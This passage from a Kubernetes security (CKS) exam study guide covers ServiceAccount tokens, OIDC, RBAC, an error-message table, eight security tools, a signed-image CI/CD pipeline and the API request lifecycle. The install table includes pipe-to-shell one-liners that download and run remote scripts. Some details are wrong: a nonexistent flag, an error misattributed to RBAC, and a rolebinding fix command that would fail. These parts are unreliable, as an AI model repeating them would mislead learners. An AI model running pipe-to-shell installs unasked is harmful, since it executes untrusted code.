  Every pod has a ServiceAccount token (JWT) mounted at:
  /var/run/secrets/kubernetes.io/serviceaccount/token

  This token is sent as an HTTP header: Authorization: Bearer <token>

  The JWT payload identifies the ServiceAccount:
  {
    "iss": "kubernetes/serviceaccount",
    "kubernetes.io/serviceaccount/namespace": "default",
    "kubernetes.io/serviceaccount/service-account.name": "default",
    "sub": "system:serviceaccount:default:default"
  }

  Why it matters for CKS:
  • The token is mounted BY DEFAULT — even if your pod never talks to the API
  • automountServiceAccountToken: false (Ch 10) disables this
  • Bound tokens (--service-account-token-volume-projection) have expiration
  • Legacy tokens are NON-expiring — they are permanent backdoors
  • The CKS exam WILL test you on disabling automount and enabling bound tokens
OIDC (OpenID Connect) — Enterprise Authentication
  HOW IT WORKS:
  1. User authenticates with external IdP (Google, GitHub, Azure AD, Okta)
  2. IdP returns an ID Token (JWT) to the user
  3. User includes ID Token in kubectl requests: --token=<id_token>
  4. API server validates the token against the IdP's public keys
  5. The JWT's "sub" claim becomes the username; "groups" claim → RBAC groups

  API server configuration (Ch 5):
  --oidc-issuer-url=https://accounts.google.com
  --oidc-client-id=anihpj-cluster.apps.googleusercontent.com
  --oidc-username-claim=email
  --oidc-groups-claim=groups

  Why it matters for CKS:
  • This is the ENTERPRISE auth method — used with Dashboards and CI/CD
  • API server flags above are CKS exam material (Ch 5, 8)
  • OIDC enables MFA — user must pass IdP's MFA before getting kubectl access
  • Groups from the IdP (e.g., "k8s-admins", "k8s-developers") map to RBAC
  • Without OIDC, you manage individual certs/tokens — does not scale

RBAC in Practice — The anihpj Example

Let's trace exactly what happens when a developer from the anihpj team tries to deploy a new version. This is the mental model you need for every RBAC question on the exam:

RBAC Walkthrough: kubectl apply anihpj-deploy.yaml
  STEP 1: Authentication (Gate 1)
  ───────────────────────────────
  User "sarah" (developer on anihpj team)
  Authentication: OIDC via Google Workspace
  Her JWT ID Token contains:
    sub: "sarah@anihpj.com"
    groups: ["k8s-developers", "anihpj-team"]

  API server identifies her as: user "sarah@anihpj.com", groups ["k8s-developers","anihpj-team"]


  STEP 2: Authorization — RBAC Lookup (Gate 2)
  ──────────────────────────────────────────────
  She runs: kubectl apply -f anihpj-deployment.yaml

  The API server checks:
  ① Does Sarah have "create deployments" permission in namespace "anihpj"?
  ② RBAC lookup algorithm:
     a. Find all RoleBindings in "anihpj" namespace that reference Sarah
        OR reference a group she belongs to
     b. Find all ClusterRoleBindings that reference Sarah or her groups
     c. Combine all Roles/ClusterRoles found
     d. Check if any of them allow "create" on "deployments" in "anihpj"

  Example RBAC that ALLOWS her:
  ──────────────────────────────
  apiVersion: rbac.authorization.k8s.io/v1
  kind: RoleBinding
  metadata:
    name: anihpj-developers
    namespace: anihpj               ← Only in anihpj namespace!
  subjects:
  - kind: Group
    name: anihpj-team               ← Sarah's OIDC group
    apiGroup: rbac.authorization.k8s.io
  roleRef:
    kind: ClusterRole
    name: edit                      ← Built-in edit role
    apiGroup: rbac.authorization.k8s.io

  RESULT: Sarah CAN create deployments in anihpj namespace.
  She CANNOT create deployments in "kube-system" or any other namespace.
  She CANNOT read Secrets even in anihpj (edit role does not include secrets).


  STEP 3: Admission Control (Gate 3)
  ──────────────────────────────────
  Her deployment YAML passes RBAC. Now admission controllers check it:
  • PodSecurity: namespace "anihpj" labeled "pod-security.kubernetes.io/enforce: restricted"
  • The deployment's pod spec must meet restricted PSS:
    - Must be non-root
    - No hostPath volumes
    - No privileged containers
    - Must have Seccomp profile
  • OPA/Gatekeeper: custom policy checks image is from anihpj-registry.io/*
  • ImagePolicyWebhook: verifies image signature (cosign)

  If all pass → Deployment created. Pod scheduled. Container starts.

Debugging Gate Failures — Real kubectl Examples

On the CKS exam, you WILL encounter broken authentication or authorization. Here are the exact error messages, what they mean, and how to fix them. Memorize these patterns:

Error MessageWhich GateRoot CauseFix Command
error: You must be logged in to the server (Unauthorized)Gate 1 (AuthN)No valid credentials in kubeconfig. Cert expired or missing.kubectl config view → check cert expiration. Renew with kubeadm certs renew (Ch 12)
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot create resource "pods" in the namespace "default"Gate 2 (AuthZ)SA has no RoleBinding allowing pod creation. Classic default SA problem.Create RoleBinding: kubectl create rolebinding create-pods --role=edit --sa=default:anihpj-sa -n anihpj
Error from server (Forbidden): ...admission webhook "validation.gatekeeper.sh" denied the request: Container is running as root. Set runAsNonRoot: true.Gate 3 (Admission)OPA/Gatekeeper or PSS policy rejected the pod. Policy reason is included in error.Fix the pod spec: add securityContext.runAsNonRoot: true and runAsUser: 1000 (Ch 17, 18)
Error from server (Forbidden): secrets is forbidden: User "sarah@anihpj.com" cannot list resource "secrets" in the namespace "anihpj"Gate 2 (AuthZ)RBAC allows deployments but NOT secrets. Built-in "edit" role does not include secrets.RBAC is working correctly — least privilege by design. Create custom Role to allow secrets access if needed (Ch 9).
error: unable to recognize "pod.yaml": no matches for kind "Pod"Gate 2 (AuthZ)You are authenticated but RBAC denies LIST on pods. API server hides resources you cannot see.kubectl auth can-i list pods. Check RoleBindings for your user/group (Ch 9).

3.3 Your Security Toolkit — Tools You Will Use Throughout This Guide

The CKS curriculum is built around a core set of open-source security tools. You will use these tools in nearly every chapter from this point forward. This section introduces each tool: what it does, when to use it, whether it appears on the CKS exam, and the key command you must memorize. Treat this as your toolbox reference — come back here whenever you encounter an unfamiliar tool in later chapters.

📖 8 Tools, 8 Purposes

Each tool addresses a specific stage of the Kubernetes security lifecycle. Together they form a complete pipeline: Assess → Scan → Detect → Enforce → Sign → Sandbox → Filter → Manage. The CKS exam tests your ability to configure and use each tool in the right context. Some are mandatory (Falco, kube-bench), others are good-to-know (cosign, Vault).

CKS Security Toolkit — 8 Tools You Must Master

🔧
kube-bench — CIS Benchmark Checker

Purpose: Checks your cluster against the CIS Kubernetes Benchmark — hundreds of security configuration tests covering API server, etcd, kubelet, and worker nodes. When to use: After cluster setup, after upgrades, and during regular security audits. CKS Exam: ✅ Yes — you must know how to run kube-bench and interpret its output. Key command: kube-bench run --targets master,node --check all. Output: PASS/WARN/FAIL for each CIS check, with remediation steps for each FAIL. Used extensively in Chapter 4.

🔍
Trivy — Image Vulnerability Scanner

Purpose: Scans container images for known CVEs (Common Vulnerabilities and Exposures), misconfigurations, and embedded secrets. When to use: In CI/CD pipelines before pushing images, and periodically against running clusters. CKS Exam: ✅ Yes — you must know how to scan an image and interpret CVE severity levels. Key command: trivy image anihpj:v1 --severity HIGH,CRITICAL. Output: CVE ID, severity, affected package, fixed version, and reference URLs. Used extensively in Chapter 23.

🦅
Falco — Runtime Threat Detection

Purpose: Monitors system calls in real-time to detect anomalous behavior — shell spawns in containers, unexpected network connections, file writes to sensitive paths. When to use: Continuously, as a DaemonSet on every node. CKS Exam: ✅ MUST know — this is one of the most heavily tested tools. You must know how to deploy Falco, read its rules, and write custom rules. Key command: falco -r /etc/falco/falco_rules.yaml. Alert example: "A shell was spawned in a container (user=root container_id=abc123)." Used extensively in Chapter 29.

📋
OPA/Gatekeeper — Policy-as-Code

Purpose: Enforces custom security policies at admission time using Rego, a declarative policy language. Gatekeeper wraps OPA with Kubernetes-native CRDs. When to use: As a ValidatingWebhook — every pod creation request is checked against your policies. CKS Exam: ✅ Yes — you must know how to write and deploy OPA policies. Key command: kubectl apply -f constraint-template.yaml && kubectl apply -f constraint.yaml. Example policy: "Reject any pod that runs as root or uses hostPath." Used extensively in Chapter 24.

🔏
cosign — Image Signing & Verification

Purpose: Cryptographically signs container images and verifies signatures before deployment. Part of the Sigstore project. When to use: In CI/CD after build (sign), and at admission time via Policy Controller (verify). CKS Exam: ✅ Know it — you must understand the concept and basic usage. Key command: cosign sign --key cosign.key myregistry/anihpj:v1 and cosign verify --key cosign.pub myregistry/anihpj:v1. Used extensively in Chapter 26.

🛡️
AppArmor — Application Sandboxing

Purpose: Linux kernel module that restricts what files, capabilities, and network resources a process (container) can access. When to use: Applied as an annotation on every pod to restrict its filesystem and network access. CKS Exam: ✅ Yes — you must know how to load profiles and apply them via annotations. Key command: apparmor_parser -a /etc/apparmor.d/anihpj-profile. Pod annotation: container.apparmor.security.beta.kubernetes.io/anihpj: localhost/anihpj-profile. Used extensively in Chapter 14.

🔒
Seccomp — Syscall Filtering

Purpose: Filters which Linux system calls a container is allowed to make. A Seccomp profile can reduce the attack surface from 300+ syscalls to just the 50-60 your application actually needs. When to use: Applied via SecurityContext on every pod. CKS Exam: ✅ Yes — you must know how to create and apply custom Seccomp profiles. Key command: The profile is a JSON file stored in /var/lib/kubelet/seccomp/. Pod field: securityContext.seccompProfile.type: Localhost + localhostProfile: anihpj-seccomp.json. Used extensively in Chapter 15.

🏦
Vault — External Secret Management

Purpose: HashiCorp Vault stores, rotates, and dynamically generates secrets outside Kubernetes. Pods authenticate to Vault and receive time-limited credentials — secrets never touch etcd. When to use: For production secrets that must never be stored in Kubernetes Secrets at all. CKS Exam: ✅ Know it — you must understand the concept and basic integration pattern. Key command: vault kv get secret/anihpj/database. K8s integration: Vault Sidecar Injector or CSI driver mounts secrets as tmpfs volumes. Used extensively in Chapter 20.

Security Tool Decision Flowchart — Which Tool for Which Task?

When you face a CKS exam task, your first question should be: "Which tool solves this problem?" This flowchart maps every security task described in the exam to the exact tool you should use. Memorize these mappings — they are your fastest path to the right answer under exam time pressure:

What are you trying to do? → Use this tool
  WHAT ARE YOU TRYING TO DO?                     →  USE THIS TOOL

  Check if my cluster passes security standards?  →  kube-bench
  ─────────────────────────────────────────────────────────────────
  $ kube-bench run --targets master --check 1.1.1,1.1.2
  → Returns PASS/FAIL for each CIS check.

  Find vulnerabilities in my container image?     →  trivy image <image>
  ─────────────────────────────────────────────────────────────────
  $ trivy image --severity HIGH,CRITICAL anihpj:v2
  → Returns CVE list with severity, package, and fix version.

  Detect suspicious activity in a running pod?    →  Falco (runtime rules)
  ─────────────────────────────────────────────────────────────────
  $ falco -r /etc/falco/falco_rules.yaml
  → Alerts: "Shell spawned in container", "Unexpected network connection".

  Prevent bad configs from reaching the cluster?  →  OPA Gatekeeper or Kyverno
  ─────────────────────────────────────────────────────────────────
  Write a Rego policy (OPA) or YAML policy (Kyverno) and apply as
  a ValidatingWebhook. The API server calls it at admission time.

  Prove my image was built by my CI pipeline?     →  cosign sign + verify
  ─────────────────────────────────────────────────────────────────
  $ cosign sign --key cosign.key myregistry/anihpj:v2
  $ cosign verify --key cosign.pub myregistry/anihpj:v2
  → "Verified OK" = image has not been tampered with since signing.

  Restrict what a container can do at the OS level? → AppArmor + Seccomp
  ─────────────────────────────────────────────────────────────────
  AppArmor: restrict file and network access by path.
  Seccomp: restrict which Linux syscalls are allowed.
  Use BOTH — they are complementary, not alternatives.

  Store secrets securely outside Kubernetes?      →  HashiCorp Vault
  ─────────────────────────────────────────────────────────────────
  $ vault kv get secret/anihpj/database
  Vault injects credentials at pod startup via CSI driver or sidecar.
  Secrets never touch etcd. Credentials rotate automatically.

Extended Component → Security Responsibility Matrix

The earlier component map covered the 5 core components. But a real cluster has more moving parts. Here is every component the CKS exam may reference — and exactly what security responsibility each one owns:

K8s ComponentSecurity ResponsibilityKey ConfigurationCKS Chapter
kube-apiserverAuthN, AuthZ, Admission, Audit, TLS termination--anonymous-auth=false, --authorization-mode=RBAC, --audit-policy-fileCh 8, 9, 28
etcdEncryption at rest, mTLS, network isolation--encryption-provider-config, --peer-cert-file, firewall on port 2379Ch 8, 19
kubeletPod security enforcement, anonymous auth off, cert rotation--anonymous-auth=false, --authorization-mode=Webhook, --rotate-certificatesCh 8, 11, 12
kube-schedulerTLS-only communication, least-privilege RBAC--tls-cert-file, --tls-private-key-file. Only needs "bind" and "update" on pods.Ch 8, 9
kube-controller-managerTLS, ServiceAccount signing key rotation--service-account-private-key-file, --use-service-account-credentialsCh 8, 10
Container runtimeSeccomp, AppArmor, namespace isolation, cgroup limits/etc/containerd/config.toml, /etc/crio/crio.conf for runtime-level Seccomp defaultsCh 14, 15, 21
CNI pluginNetworkPolicy enforcement, pod-to-pod traffic filteringCNI-specific config. Must support NetworkPolicy (Calico, Cilium, Weave; NOT Flannel)Ch 6
CoreDNSDNS security, prevent cache poisoning, restrict external queriesprometheus plugin for monitoring, errors plugin for logging. Restrict to cluster domain.Ch 8
Ingress controllerTLS termination, WAF integration, rate limiting, request filteringTLS Secret in Ingress spec, nginx.ingress.kubernetes.io/whitelist-source-range, ModSecurity WAF rulesCh 5, 7

📊 Chapter 3 Visual Summary

🏗️ 5 Components API Server, etcd, kubelet, runtime, CNI — each with specific security controls
🚪 3 Security Gates AuthN → AuthZ → Admission Control — in fixed order, every request
🔧 8 Tools kube-bench, Trivy, Falco, OPA, cosign, AppArmor, Seccomp, Vault
🛡️ 6 Defense Layers Edge → API → Network → Container → Data → Observability
💡 Key Takeaway for the CKS Exam

Every CKS exam task is a combination of Component + Tool. "Scan the image for CVEs" → Component: CI/CD pipeline, Tool: Trivy. "Block privileged pods" → Component: API server (admission), Tool: OPA/Gatekeeper. "Detect shell spawn in containers" → Component: worker node (runtime), Tool: Falco. When you see a task, identify the component first, then the tool. This chapter's component map + tool reference is your answer key for the entire exam.

Tool Installation Quick Reference — One Command Per Tool

On the CKS exam, you may need to install these tools from scratch. The exam environment has internet access and you can use package managers. These are the installation commands you must know — practice them until they are muscle memory:

ToolInstallation (One-Liner)Verify InstallExam Note
kube-benchcurl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64.tar.gz | tar xz && sudo mv kube-bench /usr/local/bin/kube-bench versionRuns as a binary on the node. No need to deploy as a pod for the exam.
Trivysudo apt-get install -y trivy or curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | shtrivy --versionUsed in CI/CD context. The exam gives you an image name — you scan it.
Falcohelm repo add falcosecurity https://falcosecurity.github.io/charts && helm install falco falcosecurity/falcokubectl logs -l app=falcoDeployed as DaemonSet. The exam asks you to configure rules or read alerts.
OPA/Gatekeeperkubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yamlkubectl get constraintsPre-installed in some exam scenarios. You write Rego policies.
cosigncurl -LO https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64 && chmod +x cosign-linux-amd64 && sudo mv cosign-linux-amd64 /usr/local/bin/cosigncosign versionUsed to sign/verify images. Generate key pair first: cosign generate-key-pair.
AppArmorsudo apt-get install -y apparmor apparmor-utils (pre-installed on most K8s nodes)sudo aa-statusExam node already has AppArmor. You load profiles and annotate pods.
SeccompBuilt into the Linux kernel. No installation needed.grep SECCOMP /boot/config-$(uname -r)You create JSON profiles and place them in /var/lib/kubelet/seccomp/.
Vaulthelm repo add hashicorp https://helm.releases.hashicorp.com && helm install vault hashicorp/vault --set server.dev.enabled=truevault statusDev mode for exam. Production setup uses auto-unseal with cloud KMS.

The anihpj CI/CD Security Pipeline — Tools in Action

Let's trace how all 8 tools work together in a real CI/CD pipeline for the anihpj Django application. This is the end-to-end security workflow you are building toward in this guide:

anihpj CI/CD Security Pipeline — Every Commit, Every Scan
  🔄 DEVELOPER PUSHES CODE TO GIT
       │
       ▼
  ┌──────────────────────────────────────────────────────────────┐
  │  STAGE 1: BUILD — Static Analysis                            │
  │  ─────────────────────────────────────────────────────────── │
  │  🔧 kube-bench: Scans the node's K8s config against CIS      │
  │     (runs on the cluster, not in CI/CD)                      │
  │  📊 Kubesec: Analyzes K8s manifests for security issues      │
  │     $ kubesec scan anihpj-deployment.yaml                    │
  │     → Score: 8/10. WARN: container runs as root.             │
  │  📊 Conftest: Validates manifests against Rego policies      │
  │     $ conftest test anihpj-deployment.yaml                   │
  │     → FAIL: runAsNonRoot must be true                        │
  └──────────────────────────┬───────────────────────────────────┘
                             │ ✅ Static analysis passes
                             ▼
  ┌──────────────────────────────────────────────────────────────┐
  │  STAGE 2: BUILD — Image Construction                         │
  │  ─────────────────────────────────────────────────────────── │
  │  $ docker build -t anihpj-registry.io/anihpj:v2 .           │
  │                                                               │
  │  🔍 Trivy: Scans the built image for CVEs                    │
  │     $ trivy image --severity HIGH,CRITICAL \\                │
  │       anihpj-registry.io/anihpj:v2                           │
  │     → 2 HIGH CVEs found in pip packages → FAIL               │
  │     → Fix: pip install --upgrade vulnerable-package          │
  │     → Rebuild → Rescan → 0 HIGH/CRITICAL → PASS              │
  └──────────────────────────┬───────────────────────────────────┘
                             │ ✅ No critical CVEs
                             ▼
  ┌──────────────────────────────────────────────────────────────┐
  │  STAGE 3: BUILD — Signing                                     │
  │  ─────────────────────────────────────────────────────────── │
  │  🔏 cosign: Sign the image                                   │
  │     $ cosign sign --key cosign.key \\                        │
  │       anihpj-registry.io/anihpj:v2                           │
  │     → Signature pushed to registry                           │
  │                                                               │
  │  $ docker push anihpj-registry.io/anihpj:v2                  │
  └──────────────────────────┬───────────────────────────────────┘
                             │ ✅ Image signed and pushed
                             ▼
  ┌──────────────────────────────────────────────────────────────┐
  │  STAGE 4: DEPLOY — Admission Control                          │
  │  ─────────────────────────────────────────────────────────── │
  │  $ kubectl apply -f anihpj-deployment.yaml                   │
  │                                                               │
  │  📋 OPA/Gatekeeper: Validates at admission time              │
  │     → Image from anihpj-registry.io? ✅                       │
  │     → runAsNonRoot: true? ✅                                  │
  │     → No hostPath? ✅                                          │
  │     → Seccomp profile specified? ✅                            │
  │     → Image signature verified (cosign)? ✅                    │
  │     → ALL POLICIES PASSED                                     │
  └──────────────────────────┬───────────────────────────────────┘
                             │ ✅ Pod admitted
                             ▼
  ┌──────────────────────────────────────────────────────────────┐
  │  STAGE 5: RUNTIME — Sandboxing + Detection                   │
  │  ─────────────────────────────────────────────────────────── │
  │  Container starts with:                                       │
  │  🛡️ AppArmor: blocks writes to /etc, /proc, /sys            │
  │  🔒 Seccomp: only 50 syscalls allowed (not 300+)             │
  │  📦 Non-root: uid 1000, no capabilities                      │
  │  📖 readOnlyRootFS: attacker cannot write tools              │
  │                                                               │
  │  🦅 Falco: Continuous runtime monitoring                    │
  │     → Watching for: shell spawn, unexpected net, sensitive   │
  │       file access, privilege escalation syscalls             │
  │                                                               │
  │  🏦 Vault: Sidecar injects DB credentials at startup        │
  │     → Credentials never touch etcd                           │
  │     → Rotated every 24 hours                                 │
  └──────────────────────────────────────────────────────────────┘

  🏁 RESULT: anihpj v2 is running, fully secured, continuously monitored.
⚠️ CKS Exam Reality Check

The CKS exam does not test the full CI/CD pipeline above — it tests individual pieces. But understanding how the pieces fit together is what separates someone who passes from someone who can actually secure a production cluster. The exam will ask you to: scan an image with Trivy OR write an OPA policy OR configure Falco rules OR apply a Seccomp profile. Rarely all at once. But when you work on real clusters after the exam, the pipeline above is your daily reality.

The Complete API Request Lifecycle — Every Security Gate in Order

When you type kubectl get pods -n anihpj, that simple command triggers a chain of security checks across four Kubernetes components. Understanding this chain is the single most valuable mental model for the CKS exam — because every exam task involves configuring one of these gates. Here is the exact sequence, with the component, the security check, and the CKS chapter that controls it:

The kubectl request lifecycle — Authentication → Authorization → Admission → Auditing
  $ kubectl get pods -n anihpj
  │
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  GATE 1: TLS MUTUAL AUTHENTICATION (kube-apiserver, port 6443)          │
  │  ────────────────────────────────────────────────────                    │
  │  • kubectl presents its client certificate to the API server.           │
  │  • API server verifies the certificate against its --client-ca-file.    │
  │  • If the cert is NOT signed by the cluster's CA → connection REFUSED. │
  │  ⚡ CKS: Chapter 7 (TLS certificates), Chapter 8 (API server hardening) │
  │  ⚡ SECURITY: Stops attackers at the network layer — they can't even     │
  │     reach the API if they don't have a valid cluster-signed cert.        │
  └──────────────────────────────────────────────────────────────────────────┘
  │  (TLS handshake succeeded — encrypted channel established)
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  GATE 2: AUTHENTICATION (kube-apiserver)                                 │
  │  ─────────────────────────────────────────                                │
  │  • API server extracts the Common Name (CN) from the client certificate. │
  │  • CN = "k8s-admin" → this is the username.                              │
  │  • Group "O" (Organization) field = "system:masters" → group membership. │
  │  • Other auth methods: bearer tokens (ServiceAccount JWTs), OIDC,       │
  │    webhook token authentication.                                          │
  │  • If anonymous-auth is enabled (the dangerous default!) and no cert is  │
  │    provided → request is authenticated as "system:anonymous".            │
  │  ⚡ CKS: Chapter 8 (disable anonymous auth), Chapter 10 (SA tokens)      │
  │  ⚡ SECURITY: Identifies WHO is making the request. Without this,         │
  │     authorization is impossible — everything is "anonymous."              │
  └──────────────────────────────────────────────────────────────────────────┘
  │  (Authenticated as: k8s-admin, groups: [system:masters])
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  GATE 3: AUTHORIZATION (kube-apiserver → RBAC)                           │
  │  ──────────────────────────────────────────────                           │
  │  • API server asks the authorizer: "Can user 'k8s-admin' [get]           │
  │    [pods] in namespace [anihpj]?"                                         │
  │  • RBAC authorizer checks ALL ClusterRoleBindings + RoleBindings.        │
  │  • Finds: RoleBinding "anihpj-reader" binds user "k8s-admin" to Role     │
  │    "pod-reader" which has: verbs: [get, list], resources: [pods].         │
  │  • MATCH → ALLOWED. kube-apiserver proceeds to the next gate.            │
  │  • If NO matching binding → DENIED. 403 Forbidden returned.              │
  │  ⚡ CKS: Chapter 9 (RBAC), Chapter 11 (Node authorization)               │
  │  ⚡ SECURITY: Determines WHAT the authenticated user can do. The most    │
  │     heavily tested CKS domain — every exam has at least 2 RBAC tasks.    │
  └──────────────────────────────────────────────────────────────────────────┘
  │  (Authorized: get pods in anihpj → ALLOWED)
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  GATE 4: ADMISSION CONTROL (kube-apiserver → webhooks)                   │
  │  ─────────────────────────────────────────────────────                    │
  │  • NOTE: Admission control runs for MUTATING requests (create, update,   │
  │    delete). For READ requests (get, list, watch), this gate is SKIPPED.  │
  │  • For a CREATE pod request:                                              │
  │    a) MUTATING admission webhooks run first: Kyverno adds a default      │
  │       runAsNonRoot: true if not specified. Istio injects the sidecar.    │
  │    b) VALIDATING admission webhooks run second: OPA checks that the      │
  │       pod has runAsNonRoot=true. Kyverno verifies the image signature.   │
  │    c) If ANY validating webhook returns DENY → request is REJECTED.      │
  │  ⚡ CKS: Chapter 24 (Admission Controllers), Chapter 26 (cosign/Kyverno) │
  │  ⚡ SECURITY: Policy enforcement BEFORE the object is persisted to etcd. │
  │     Stops bad configurations BEFORE they become running pods.            │
  └──────────────────────────────────────────────────────────────────────────┘
  │  (For this GET request: admission is SKIPPED — GET doesn't mutate state)
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  GATE 5: AUDIT LOGGING (kube-apiserver records the event)                │
  │  ──────────────────────────────────────────────────────                   │
  │  • Audit policy determines what gets logged and at what level.           │
  │  • For this GET request (if audit policy includes pods/get):             │
  │    {"kind":"Event","level":"RequestResponse","verb":"get",                │
  │     "user":{"username":"k8s-admin","groups":["system:masters"]},          │
  │     "objectRef":{"resource":"pods","namespace":"anihpj"},                 │
  │     "responseStatus":{"code":200},                                        │
  │     "requestReceivedTimestamp":"2026-06-14T11:23:45Z"}                    │
  │  ⚡ CKS: Chapter 28 (Audit Logging)                                       │
  │  ⚡ SECURITY: Non-repudiation. Every action is recorded with WHO,         │
  │     WHAT, WHEN, and RESULT. In a breach investigation, this is gold.      │
  └──────────────────────────────────────────────────────────────────────────┘
  │
  ▼
  kubectl receives the list of pods in anihpj namespace. Total gates passed: 4 of 5.
  (Admission skipped for GET. All other gates: passed.)

The CKS exam maps to these gates: Gate 1 (TLS) → Ch7-8. Gate 2 (AuthN) → Ch8, 10. Gate 3 (AuthZ) → Ch9, 11. Gate 4 (Admission) → Ch24, 26. Gate 5 (Audit) → Ch28. When you see an exam question, identify which gate it's asking about, and you'll know exactly which chapter's tools to reach for.
